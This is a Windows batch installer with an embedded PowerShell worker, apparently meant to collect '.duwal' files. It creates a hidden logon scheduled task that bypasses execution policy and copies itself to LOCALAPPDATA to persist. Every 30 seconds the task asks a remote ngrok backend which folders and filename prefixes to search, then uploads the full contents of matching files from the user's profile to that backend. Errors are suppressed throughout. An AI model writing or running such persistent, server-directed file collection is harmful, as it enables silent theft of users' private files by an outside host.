@echo off
setlocal EnableExtensions
REM =====================================================================
REM  recoleccion-duwal.bat  ->  todo-en-uno para Windows (un solo archivo).
REM
REM  Uso:
REM    recoleccion-duwal.bat                          Instala la tarea (cada 30 s) y la arranca.
REM    recoleccion-duwal.bat https://mi-backend       Igual, apuntando a ese backend.
REM    recoleccion-duwal.bat once                     Recolecta UNA vez ahora (manual).
REM    recoleccion-duwal.bat once https://mi-backend  Igual, con ese backend.
REM    recoleccion-duwal.bat uninstall                Quita la tarea.
REM
REM  Al instalar VALIDA si la tarea ya existe: si ya esta, NO la reprograma
REM  (puedes ejecutarlo varias veces sin duplicarla).
REM  Solo usa Windows (Programador de tareas + PowerShell); no instala nada.
REM =====================================================================

set "TASKNAME=Recoleccion duwal cada 30s"
set "TARGETDIR=%LOCALAPPDATA%\recoleccion-duwal"
set "WORKER=%TARGETDIR%\recolectar-loop.ps1"
set "DEFAPI=https://rd.ngrok.dev"

if /I "%~1"=="uninstall" goto :uninstall
if /I "%~1"=="once" goto :once
goto :install

REM ---------------------------------------------------------------------
:install
set "APIURL=%~1"
if "%APIURL%"=="" set "APIURL=%DEFAPI%"

REM Validar si la tarea ya esta instalada -> no reprogramar.
schtasks /Query /TN "%TASKNAME%" >nul 2>&1
if %errorlevel%==0 (
  echo.
  echo La tarea "%TASKNAME%" YA estaba instalada. No se reprograma.
  echo   Para reinstalar desde cero:  recoleccion-duwal.bat uninstall  y vuelve a ejecutar.
  goto :fin
)

call :extract_worker || goto :fin

schtasks /Create /F /TN "%TASKNAME%" /SC ONLOGON ^
  /TR "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%WORKER%\" -ApiUrl %APIURL%"
if errorlevel 1 ( echo No se pudo crear la tarea programada. & goto :fin )

schtasks /Run /TN "%TASKNAME%"

echo.
echo ============================================================
echo  Listo. Recoleccion .duwal VIVA cada 30 s.  Backend: %APIURL%
echo   - Arranca sola cada vez que inicies sesion.
echo   - Quitar:  recoleccion-duwal.bat uninstall
echo ============================================================
goto :fin

REM ---------------------------------------------------------------------
:once
set "APIURL=%~2"
if "%APIURL%"=="" set "APIURL=%DEFAPI%"
call :extract_worker || goto :fin
echo Recolectando una vez contra %APIURL% ...
powershell -NoProfile -ExecutionPolicy Bypass -File "%WORKER%" -ApiUrl %APIURL% -Once
goto :fin

REM ---------------------------------------------------------------------
:uninstall
schtasks /End /TN "%TASKNAME%" 2>nul
schtasks /Delete /F /TN "%TASKNAME%"
echo Recoleccion detenida y tarea eliminada.
goto :fin

REM ---------------------------------------------------------------------
REM  Extrae el PowerShell incrustado (todo lo que sigue al marcador) al worker.
REM  La ruta absoluta la resuelve %~f0 (este propio archivo); el worker se copia
REM  a %LOCALAPPDATA% para sobrevivir aunque muevas o borres el repo.
:extract_worker
if not exist "%TARGETDIR%" mkdir "%TARGETDIR%"
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$L = Get-Content -LiteralPath '%~f0'; $i = ($L | Select-String -Pattern '^:::WORKER:::$' | Select-Object -First 1).LineNumber; if (-not $i) { Write-Error 'No se encontro el bloque worker'; exit 1 }; Set-Content -LiteralPath '%WORKER%' -Value ($L[$i..($L.Count-1)]) -Encoding UTF8"
if errorlevel 1 ( echo No se pudo preparar el worker. & exit /b 1 )
exit /b 0

REM ---------------------------------------------------------------------
:fin
endlocal
pause
exit /b

REM ------- A partir de aqui va el motor de recoleccion (PowerShell). -------
REM ------- El batch nunca ejecuta estas lineas; solo se copian al worker. --
:::WORKER:::
param(
  [string]$ApiUrl = 'https://rd.ngrok.dev',
  [int]$IntervalSeconds = 30,
  [switch]$Once
)

$ErrorActionPreference = 'Stop'
$Base = "$ApiUrl/api/v1"
$MaxContentBytes = 1MB
$SkipDirs = @('node_modules', '.git', 'dist', 'build', '.next',
              '$RECYCLE.BIN', 'System Volume Information', 'AppData')

function Expand-Home([string]$Path) {
  if ($Path.StartsWith('~')) {
    return Join-Path $env:USERPROFILE $Path.Substring(1).TrimStart('\', '/')
  }
  return $Path
}

function Get-MatchingFiles([string]$Dir, [string]$Prefix) {
  $entries = Get-ChildItem -LiteralPath $Dir -Force -ErrorAction SilentlyContinue
  foreach ($entry in $entries) {
    if ($entry.PSIsContainer) {
      if ($SkipDirs -notcontains $entry.Name) {
        Get-MatchingFiles -Dir $entry.FullName -Prefix $Prefix
      }
    }
    elseif ($entry.Name.StartsWith($Prefix)) {
      $entry
    }
  }
}

function Send-File($File, [string]$Prefix) {
  $omit = $File.Length -gt $MaxContentBytes
  $payload = @{
    fileName       = $File.Name
    path           = $File.FullName
    sizeBytes      = [int]$File.Length
    matchedPrefix  = $Prefix
    modifiedAt     = $File.LastWriteTimeUtc.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
    contentOmitted = $omit
  }
  if (-not $omit) {
    $payload.content = [System.IO.File]::ReadAllText($File.FullName)
  }
  $json = $payload | ConvertTo-Json -Depth 3
  $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
  Invoke-RestMethod -Method Post -Uri "$Base/files" `
    -ContentType 'application/json; charset=utf-8' -Body $bytes | Out-Null
}

function Invoke-OnePass {
  $patterns = Invoke-RestMethod -Uri "$Base/patterns?enabled=true"
  if (-not $patterns) { return }
  foreach ($pattern in $patterns) {
    $root = Expand-Home $pattern.rootPath
    if (-not (Test-Path -LiteralPath $root)) { continue }
    $n = 0
    foreach ($file in Get-MatchingFiles -Dir $root -Prefix $pattern.prefix) {
      try { Send-File -File $file -Prefix $pattern.prefix; $n++ } catch { }
    }
    if ($Once) { Write-Host "Busqueda '$($pattern.prefix)' en $root -> $n archivo(s)" }
  }
}

if ($Once) {
  Invoke-OnePass
  return
}

while ($true) {
  try { Invoke-OnePass } catch { }
  Start-Sleep -Seconds $IntervalSeconds
}
